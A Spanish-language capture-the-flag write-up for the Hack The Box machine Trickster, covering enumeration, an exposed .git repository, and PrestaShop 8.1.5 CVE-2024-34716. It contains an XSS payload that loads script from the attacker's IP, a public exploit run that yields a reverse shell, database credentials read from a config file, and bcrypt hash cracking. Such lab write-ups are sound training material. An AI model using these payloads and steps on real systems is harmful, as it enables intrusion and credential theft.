---
description: >-
  Writeup de la máquina de dificultad media Trickster de la página https://hackthebox.eu
title: Hack The Box - Trickster | (Difficulty Medium) - Linux
date: 2025-02-1
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, linux, medium, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/68c7e29e-5394-442f-b624-df3200f6c713

---

## Useful Skills

* Web enumeration
* Extracting the contents of .git directory (git-dumper)
* Abusing PrestaShop 8.1.5 XSS to RCE (CVE-2024-34716)
* Information lekeage
* Cracking hashes (hashcat)

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.34 --ulimit 5000 -g
10.10.11.34 -> [22,80]
```

```bash
nmap -p22,80 -sCV 10.10.11.34 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 20:15 CET
Nmap scan report for 10.10.11.34
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.34 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 20:16 CET
Nmap scan report for 10.10.11.34
Host is up (0.037s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
772/udp   closed cycleserv2
8010/udp  closed unknown
22862/udp closed unknown
23322/udp closed unknown
26026/udp closed unknown
41967/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```

> Hay que añadir el dominio trickster.htb en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 10.10.11.34
{: .prompt-tip }

### HTTP Enumeration

Whatweb reporta un servidor Apache 2.4.52, y un código de estado 403-Forbidden

```bash
whatweb http://trickster.htb
http://trickster.htb [403 Forbidden] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.34], Title[403 Forbidden]
```

Accediendo a la página en http://trickster.htb/ puedo observar una página web dedicada al comercio minorista online

![imagen](https://github.com/user-attachments/assets/06cbe552-d1bc-4362-80f3-23b3f6cf4fa4)

Al intentar acceder a shop obtengo un mensaje el cual indica que no se puede conectar a http://shop.trickster.htb

![imagen](https://github.com/user-attachments/assets/8db23a76-a609-41b6-b69f-1069b4d2bf77)

> Hay que añadir el subdominio shop.trickster.htb en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 10.10.11.34
{: .prompt-tip }

Utilizo gobuster para realizar una enumeración exhaustiva de directorios

```bash
gobuster dir -u http://trickster.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -b 403,404 -q
```

```bash
gobuster dir -u http://shop.trickster.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -b 403,404 -q
/.git/config          (Status: 200) [Size: 112]
/.git                 (Status: 301) [Size: 323] [--> http://shop.trickster.htb/.git/]
/.git/HEAD            (Status: 200) [Size: 28]
/.git/logs/           (Status: 200) [Size: 1137]
/.git/index           (Status: 200) [Size: 252177]
```

Utilizo la herramienta git-dumper para dumpear todo el repositorio git del sitio web

* [Git Dumper tool](https://github.com/arthaud/git-dumper.git)

```bash
python3 git_dumper.py http://shop.trickster.htb/.git/ .
```

Observo los logs del repositorio git con el comando git log, no consigo observar nada interesante, simplemente una actualización del panel de administración, también consigo observar un dirección email la cual es adam@trickster.htb

```bash
git log

commit 0cbc7831c1104f1fb0948ba46f75f1666e18e64c (HEAD -> admin_panel)
Author: adam <adam@trickster.htb>
Date:   Fri May 24 04:13:19 2024 -0400
update admin pannel
```

```bash
git show 0cbc7831c1104f1fb0948ba46f75f1666e18e64c

diff --git a/.php-cs-fixer.dist.php b/.php-cs-fixer.dist.php
new file mode 100644
index 0000000..4f6c2eb
--- /dev/null
+++ b/.php-cs-fixer.dist.php
@@ -0,0 +1,52 @@
+<?php
+
+ini_set('memory_limit','256M');
+
+$finder = PhpCsFixer\Finder::create()->in([
+    __DIR__.'/src',
+    __DIR__.'/classes',
+    __DIR__.'/controllers',
+    __DIR__.'/tests',
+    __DIR__.'/tools/profiling',
+])->notPath([
+    'Unit/Resources/config/params.php',
+    'Unit/Resources/config/params_modified.php',
+]);
+
+return (new PhpCsFixer\Config())
+    ->setRiskyAllowed(true)
+    ->setRules([
+        '@Symfony' => true,
+        'array_indentation' => true,
+        'cast_spaces' => [
+            'space' => 'single',
+        ],
+        'combine_consecutive_issets' => true,
+        'concat_space' => [
+            'spacing' => 'one',
+        ],
+        'error_suppression' => [
+            'mute_deprecation_error' => false,
+            'noise_remaining_usages' => false,
+            'noise_remaining_usages_exclude' => [],
+        ],
+        'function_to_constant' => false,
+        'method_chaining_indentation' => true,
+        'no_alias_functions' => false,
+        'no_superfluous_phpdoc_tags' => false,
+        'non_printable_character' => [
+            'use_escape_sequences_in_strings' => true,
+        ],
+        'phpdoc_align' => [
+            'align' => 'left',
+        ],
+        'phpdoc_summary' => false,
+        'protected_to_private' => false,
+        'psr_autoloading' => false,
+        'self_accessor' => false,
+        'yoda_style' => false,
+        'single_line_throw' => false,
+        'no_alias_language_construct_call' => false,
+    ])
+    ->setFinder($finder)
+    ->setCacheFile(__DIR__.'/var/.php_cs.cache');
```

Al hacer ls para observar los directorios y archivos que existen, veo un directorio que me llama la atención, el cual es admin634ewutrx1jgitlooaj

```bash
ls
admin634ewutrx1jgitlooaj  autoload.php  error500.html  git-dumper  index.php  init.php  Install_PrestaShop.html  INSTALL.txt  LICENSES  Makefile
```

Me dirijo a http://shop.trickster.htb/admin634ewutrx1jgitlooaj/ para observar si existe el directorio, para mi sorpresa me encuentro con un panel de administración de login de PrestaShop, donde consigo ver la versión de PrestaShop, la cual es 8.1.5

![imagen](https://github.com/user-attachments/assets/f2015668-94e5-42e0-bf84-95a138ac2e76)

> Sabiendo que es PrestaShop y que la versión es 8.1.5 puedo buscar información sobre posibles vulnerabilidades existentes
{: .prompt-info }

## Vulnerability analysis

### CVE-2024-34716 (PrestaShop 8.1.5 XSS to RCE)

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2024-34716, se trata de un XSS que deriva en una Ejecución Remota de comandos.

* [NVD Explanation CVE-2024-34716](https://nvd.nist.gov/vuln/detail/CVE-2024-34716)

## Exploitation

Encuentro un exploit asociado a un artículo sobre la vulnerabilidad CVE-2024-34716 el cual me sirve para entender como funciona todo.

* [CVE-2024-34716 XSS to Remote Codeecution on PrestaShop <=8.1.5](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/)

![imagen](https://github.com/user-attachments/assets/c0c4d637-fc02-4c82-beaf-d1cfaa743e15)

* [CVE-2024-34716_PoC_Exploit](https://github.com/aelmokhtar/CVE-2024-34716)

![imagen](https://github.com/user-attachments/assets/2bfed678-8ab0-4605-9819-07c611b65c6d)

El árticulo indica que en /contact-us/ existe un campo el cual permite adjuntar un archivo, donde es posible introducir un .png con codigo JS el cual será interpretado cuando un administrador reciba la notificación. Me dirigo a http://shop.trickster.htb/contact-us/

![imagen](https://github.com/user-attachments/assets/1fee2fe5-0fd4-422b-a231-cc3978b8a52a)

Creo un archivo test.png con el siguiente codigo JS, el cual si es verdad que es interpretado deberé de recibir una solicitud HTTP al servidor Python

```js
<script src="http://10.10.14.197:8000/exploit.js"></script>
```

Levanto un servidor en Python y relleno el formulario de contacto adjuntando el archivo .png malicioso

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

![imagen](https://github.com/user-attachments/assets/fa596c0e-ae10-4820-93e3-7ab4e97b6ef7)

![imagen](https://github.com/user-attachments/assets/dcb75ed9-6510-4f2f-8174-1fb714b68595)

Compruebo que es cierto que el codigo JS es interpretado, ya que recibo una solicitud GET intentando cargar el recurso exploit.js

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.34 - - [02/Feb/2025 11:30:44] code 404, message File not found
10.10.11.34 - - [02/Feb/2025 11:30:44] "GET /exploit.js HTTP/1.1" 404 -
```

Para automatizar el proceso de subida del archivo malicioso y la extracción del token utilizaré ejecutare el exploit en Python

```bash
python3 exploit.py --url http://shop.trickster.htb --local-ip 10.10.14.197 --email adam@trickster.htb --admin-path admin634ewutrx1jgitlooaj
[X] Starting exploit with:
	Url: http://shop.trickster.htb
	Email: adam@trickster.htb
	Local IP: 10.10.14.197
	Admin Path: admin634ewutrx1jgitlooaj
[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.
Serving at http.Server on port 5000
listening on [any] 12345 ...
Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
Response: 200 -
10.10.11.34 - - [02/Feb/2025 11:36:10] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
connect to [10.10.14.197] from (UNKNOWN) [10.10.11.34] 51386
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:36:19 up 15:34,  0 users,  load average: 0.49, 0.23, 0.33
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

> El exploit utiliza ncat para entablar la reverse shell, por lo que para utilizar netcat hay que modificar el codigo de Python
{: .prompt-info }

## Post exploitation

### User Pivoting

Obtengo acceso al sistema como el usuario www-data, este es un usuario con bajo privilegios por lo que debo de buscar alguna manera de pivotar hacia otro usuario. Comenzaré visualizando cuales son los usuarios que existen en el sistema.

```bash
www-data@trickster:/$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:trickster:/home/james:/bin/bash
adam:x:1002:1002::/home/adam:/bin/bash
runner:x:1003:1003::/home/runner:/bin/sh
```

Como es habitual comienzo intentando buscar archivos de configuración que puedan contener credenciales de acceso a una base de datos o como usuario del sistema. Realizo una búsqueda en internet para saber donde se encuentra el archivo de configuración de la base de datos de PrestaShop, encuentro un artículo que indica que en /you-website/app/config/parameters.php se encuentra el archivo

* [Encontrar el archivo de configuración de la base de datos de PrestaShop](https://www.prestasoo.com/es/blog/prestashop-database-config-file)

Supongo que el sitio web de PrestaShop se encuentra alojado en /var/www por lo que visualizo el archivo de configuración de la base de datos en /var/www/prestashop/app/config/parameters.php

```bash
www-data@trickster:/$ cat /var/www/prestashop/app/config/parameters.php
```

Consigo ver unas credenciales de acceso al base de datos del sistema

```php
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
    'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
    'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47',
    'api_public_key' => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
Scu6QqRAdotokqW2m3aMt+LV8ERdFsBkj+/OVdJ8oslvSt6Kgf39DnBpGIXAqaFc
QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
ZQIDAQAB
-----END PUBLIC KEY----
```

Accedo a la base de datos con el usuario ps_user y la contraseña prest@shop_o

```bash
www-data@trickster:/$ mysql -h 127.0.0.1 -ups_user -pprest@shop_o
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 21970
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Visualizo las bases de datos existentes y solo observo una, la cual es prestashop, por lo que acceso a la misma

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)
```

```bash
MariaDB [(none)]> use prestashop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Visualizando tables, observo que la tabla ps_employee contiene contraseñas

```bash
MariaDB [prestashop]> describe ps_employee;
+--------------------------+---------------------+------+-----+---------------------+----------------+
| Field                    | Type                | Null | Key | Default             | Extra          |
+--------------------------+---------------------+------+-----+---------------------+----------------+
| id_employee              | int(10) unsigned    | NO   | PRI | NULL                | auto_increment |
| id_profile               | int(10) unsigned    | NO   | MUL | NULL                |                |
| id_lang                  | int(10) unsigned    | NO   |     | 0                   |                |
| lastname                 | varchar(255)        | NO   |     | NULL                |                |
| firstname                | varchar(255)        | NO   |     | NULL                |                |
| email                    | varchar(255)        | NO   | MUL | NULL                |                |
| passwd                   | varchar(255)        | NO   |     | NULL                |                |
| last_passwd_gen          | timestamp           | NO   |     | current_timestamp() |                |
| stats_date_from          | date                | YES  |     | NULL                |                |
| stats_date_to            | date                | YES  |     | NULL                |                |
| stats_compare_from       | date                | YES  |     | NULL                |                |
| stats_compare_to         | date                | YES  |     | NULL                |                |
| stats_compare_option     | int(1) unsigned     | NO   |     | 1                   |                |
| preselect_date_range     | varchar(32)         | YES  |     | NULL                |                |
| bo_color                 | varchar(32)         | YES  |     | NULL                |                |
| bo_theme                 | varchar(32)         | YES  |     | NULL                |                |
| bo_css                   | varchar(64)         | YES  |     | NULL                |                |
| default_tab              | int(10) unsigned    | NO   |     | 0                   |                |
| bo_width                 | int(10) unsigned    | NO   |     | 0                   |                |
| bo_menu                  | tinyint(1)          | NO   |     | 1                   |                |
| active                   | tinyint(1) unsigned | NO   |     | 0                   |                |
| optin                    | tinyint(1) unsigned | YES  |     | NULL                |                |
| id_last_order            | int(10) unsigned    | NO   |     | 0                   |                |
| id_last_customer_message | int(10) unsigned    | NO   |     | 0                   |                |
| id_last_customer         | int(10) unsigned    | NO   |     | 0                   |                |
| last_connection_date     | date                | YES  |     | NULL                |                |
| reset_password_token     | varchar(40)         | YES  |     | NULL                |                |
| reset_password_validity  | datetime            | YES  |     | NULL                |                |
| has_enabled_gravatar     | tinyint(3) unsigned | NO   |     | 0                   |                |
+--------------------------+---------------------+------+-----+---------------------+----------------+
29 rows in set (0.002 sec)
```

Por lo que realizo una consulta para recuperar el email y la contraseña de la tabla ps_employee

```bash
MariaDB [prestashop]> select email,passwd from ps_employee;
+---------------------+--------------------------------------------------------------+
| email               | passwd                                                       |
+---------------------+--------------------------------------------------------------+
| admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |
| james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |
+---------------------+--------------------------------------------------------------+
2 rows in set (0.000 sec)
```

A simple visto observar que el formato de los hashes es bcrypt, utilizo John The Ripper y tras un rato de espera consigo crackear el hash del usuario james, usuario existente en el sistema.

```bash
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
john --show hashes
?:alwaysandforever
```

Intento acceder por ssh como el usuario james, consigo exitosamente acceder.

```bash
ssh james@trickster.htb
The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
james@trickster.htb's password: 
Last login: Sun Feb  2 09:27:33 2025 from 10.10.14.95
james@trickster:~$ whoami
james
```

### Privilege escalation

